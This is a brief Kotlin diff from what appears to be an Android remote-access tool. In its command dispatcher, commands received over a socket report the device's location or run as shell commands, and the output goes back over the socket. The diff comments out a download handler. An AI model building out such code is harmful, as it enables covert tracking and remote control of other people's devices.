@@ -123,7 +123,7 @@ private suspend fun executeCommand(
         "location"-> CommandHandler.handleCurrentLocation(context, socketOutput, shellOutput)
         else -> {
             if (command.startsWith("download")) {
-                CommandHandler.handleDownload(command, socketOutput, socketInput)
+//                CommandHandler.handleDownload(command, socketOutput, socketInput)
             }
             else {
                 CommandHandler.handleShellCommand(command, shellOutput, socketOutput)
